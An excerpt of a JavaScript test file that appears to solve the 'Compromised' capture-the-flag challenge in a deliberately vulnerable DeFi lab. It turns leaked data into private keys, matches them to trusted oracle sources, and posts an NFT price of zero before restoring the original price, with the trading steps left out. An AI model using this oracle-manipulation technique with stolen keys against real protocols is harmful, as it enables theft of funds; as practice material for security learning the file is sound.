...
describe("Compromised challenge", function () {
  ...
  it("Exploit", async function () {
    ...
    AccountFromData1 = new ethers.Wallet(decode(data1), ethers.provider);
    AccountFromData2 = new ethers.Wallet(decode(data2), ethers.provider);

    // Check if any data is a oracle source
    accounts = [];
    sources.forEach((source) => {
      if (source == AccountFromData1.address) {
        accounts.push(AccountFromData1);
      } else if (source == AccountFromData2.address) {
        accounts.push(AccountFromData2);
      }
    });

    // Set new sources price
    for (let account of accounts) {
      await this.oracle.connect(account).postPrice("DVNFT", 0);
    }
    ...
    // Set oracle initial prices
    for (let account of accounts) {
      await this.oracle.connect(account).postPrice("DVNFT", INITIAL_NFT_PRICE);
    }
